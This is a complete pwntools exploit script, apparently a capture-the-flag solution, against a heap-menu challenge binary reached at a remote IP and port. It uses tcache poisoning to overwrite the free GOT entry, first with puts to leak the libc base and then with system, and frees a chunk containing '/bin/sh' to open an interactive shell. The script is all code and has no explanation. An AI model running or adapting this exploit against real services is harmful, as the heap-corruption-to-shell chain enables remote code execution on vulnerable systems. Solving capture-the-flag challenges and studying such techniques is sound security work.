from pwn import *
context.binary = exe = ELF("./chall")
libc = ELF("./libc-2.31.so")

def GDB():
    gdb.attach(p,gdbscript='''
    ''')
    input()




def create(index,size):
    p.sendlineafter(b">> ",b"1")
    p.sendlineafter(b">>",f"{index}".encode())
    p.sendlineafter(b">> ",f"{size}".encode())

def change_size(index,size):
    p.sendlineafter(b">>",b"2")
    p.sendlineafter(b">>",f"{index}".encode())
    p.sendlineafter(b">>",f"{size}".encode()) 

def delete(index):
    p.sendlineafter(b">> ",b"3")
    p.sendlineafter(b">>",f"{index}".encode())

def edit(index,data):
    p.sendlineafter(b">> ",b"4")
    p.sendlineafter(b">>",f"{index}".encode())
    p.sendlineafter(b">>",data)


# p = process(exe.path)
p = remote("34.70.212.151",8001)
# GDB()

for i in range(8):
    create(i,0x80)
for i in range(8):
    delete(i)

for i in range(7):
    create(i,0x30)

for i in range(7):
    delete(i)


edit(6,p64(exe.got['free'] - 0x28))
create(0,0x30)
create(1,0x30)

create(2,0x500)
create(3,0x400)
delete(2)
print("leaking")
edit(1,b"\x00"*0x28+p64(exe.plt['puts']))
delete(2)
p.recvuntil(b">> ")
p.recvuntil(b">> ")
p.recvuntil(b">> ")
leak = int.from_bytes(p.recvline()[:-1],"little")
libc.address = leak - 0x1ecbe0
log.info('[+]LIBC BASE:'+hex(libc.address))
edit(3,b"/bin/sh\x00")
edit(1,b"\x00"*0x28 + p64(libc.sym['system']))
delete(3)

p.interactive()
